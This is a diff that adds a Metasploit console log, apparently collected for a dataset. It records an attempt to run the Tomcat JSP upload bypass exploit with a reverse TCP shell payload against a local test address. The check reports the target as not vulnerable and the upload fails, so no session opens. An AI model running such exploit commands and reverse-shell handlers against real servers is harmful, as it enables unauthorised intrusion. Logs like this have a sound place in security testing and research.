@@ -1,0 +1,19 @@
+[*] Spooling to file /home/kali/dataset/raw/metasploit/2026-08-04/tomcat_12615/scan.txt...
+resource (/tmp/tomcat.rc)> search cve:2017-12615
+[-] No results from search
+resource (/tmp/tomcat.rc)> use exploit/multi/http/tomcat_jsp_upload_bypass
+[*] No payload configured, defaulting to generic/shell_reverse_tcp
+resource (/tmp/tomcat.rc)> set RHOSTS 127.0.0.16
+RHOSTS => 127.0.0.16
+resource (/tmp/tomcat.rc)> set RPORT 18082
+RPORT => 18082
+resource (/tmp/tomcat.rc)> set TARGETURI /
+TARGETURI => /
+resource (/tmp/tomcat.rc)> check
+[*] 127.0.0.16:18082 - The target is not exploitable. The target is not vulnerable
+resource (/tmp/tomcat.rc)> run
+[*] Started reverse TCP handler on 10.0.2.15:4444 
+[*] Uploading payload...
+[-] Exploit aborted due to failure: unexpected-reply: Failed to upload the payload
+[*] Exploit completed, but no session was created.
+resource (/tmp/tomcat.rc)> spool off
